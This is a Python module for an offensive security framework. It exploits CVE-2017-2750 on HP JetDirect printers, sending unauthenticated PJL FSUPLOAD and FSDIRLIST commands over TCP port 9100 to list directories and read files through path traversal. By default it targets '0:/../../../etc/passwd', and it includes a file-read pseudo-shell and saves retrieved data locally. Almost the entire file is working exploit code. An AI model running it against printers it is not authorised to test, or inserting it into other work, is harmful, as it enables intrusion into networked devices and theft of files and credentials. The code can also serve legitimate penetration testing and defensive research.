#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""HP JetDirect / raw printing port 9100 PJL filesystem read and listing."""

import socket
from typing import Optional

from kittysploit import *
from lib.protocols.http.lfi import Lfi
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Auxiliary, Tcp_scanner_client, Lfi):
    __info__ = {
        "name": "HP JetDirect PJL Filesystem Read (port 9100)",
        "description": (
            "Reads files and lists directories on network printers exposing raw "
            "JetDirect/AppSocket on TCP 9100 via PJL FSUPLOAD/FSDIRLIST."
        ),
        "author": ["Zero Day Initiative", "KittySploit Team"],
        "cve": ["CVE-2017-2750"],
        "platform": Platform.MULTI,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2017-2750",
            "https://book.hacktricks.wiki/en/network-services-pentesting/9100-pjl.html",
        ],
        "tags": ["hp", "jetdirect", "pjl", "printer", "port-9100", "file-read", "unauth"],
        "agent": {
            "risk": "intrusive",
            "effects": ["data_exfiltration"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "requires": {"endpoint_pattern_any": [":9100"]},
            "chain": {
                "produces_capabilities": [{"capability": "file_read", "from_detail": "PJL FSUPLOAD traversal"}],
                "suggested_followups": [
                    "scanner/tcp/jetdirect_pjl_detect",
                ],
            },
        },
    }

    port = OptPort(9100, "JetDirect raw printing port", True)
    action = OptChoice(
        "read",
        "PJL action: read file (FSUPLOAD), list directory (FSDIRLIST), or INFO ID",
        False,
        choices=["read", "dirlist", "info"],
    )
    file_read = OptString(
        "0:/../../../etc/passwd",
        "PJL filesystem path to read when action=read",
        True,
    )
    remote_path = OptString("0:/", "PJL path for dirlist when file_read is unused", False, advanced=True)
    read_size = OptInteger(65535, "FSUPLOAD SIZE parameter", False, advanced=True)
    dir_count = OptInteger(999, "FSDIRLIST COUNT parameter", False, advanced=True)
    output_file = OptString("", "Local path to write retrieved content", False)
    output_limit = OptInteger(12000, "Max chars to print when output_file empty (0=full)", False, advanced=True)

    _UEL = "\x1b%-12345X"

    def _send_pjl(self, body: str) -> str:
        payload = f"{self._UEL}@PJL {body}\r\n{self._UEL}\r\n"
        host = self._host()
        if not host:
            return ""
        sock: Optional[socket.socket] = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(max(self._timeout(), 8.0))
            sock.connect((host, int(self._port())))
            sock.sendall(payload.encode("ascii", errors="replace"))
            chunks: list[bytes] = []
            while True:
                try:
                    data = sock.recv(4096)
                except socket.timeout:
                    break
                if not data:
                    break
                chunks.append(data)
            text = b"".join(chunks).decode("utf-8", errors="replace")
            if "@PJL ERROR" in text.upper() or "FILEERROR" in text.upper():
                return ""
            return text
        except Exception:
            return ""
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass

    def execute(self, file_path: str) -> str:
        action = str(self.action or "read").strip().lower()
        if action == "info":
            return self._send_pjl("INFO ID")
        if action == "dirlist":
            remote = str(file_path or self.remote_path or "0:/").strip()
            count = max(1, int(self.dir_count or 999))
            return self._send_pjl(f'FSDIRLIST NAME="{remote}" ENTRY=1 COUNT={count}')
        remote = str(file_path or self.file_read or "0:/../../../etc/passwd").strip()
        size = max(1, int(self.read_size or 65535))
        return self._send_pjl(f'FSUPLOAD NAME="{remote}" OFFSET=0 SIZE={size}')

    def run(self):
        action = str(self.action or "read").strip().lower()
        if bool(self.shell_lfi) and action == "read":
            print_status("JetDirect PJL file-read pseudo-shell")
            self.handler_lfi()
            return True

        if action == "read":
            target = str(self.file_read or "").strip()
        elif action == "info":
            target = ""
        else:
            target = str(self.remote_path or "0:/").strip()
        if not target and action != "info":
            print_error("file_read or remote_path is required")
            return False

        print_status(f"JetDirect PJL {action} on {self.target}:{int(self.port)}")
        data = self.execute(target)
        if not data:
            print_error("PJL command returned no usable data")
            return False

        local = str(self.output_file or "").strip()
        if local:
            with open(local, "w", encoding="utf-8", errors="ignore") as fh:
                fh.write(data)
            print_success(f"Wrote {len(data)} bytes to {local}")
        else:
            limit = int(self.output_limit or 0)
            print_info(data if limit <= 0 else data[:limit] + "\n... [truncated]")
        return True
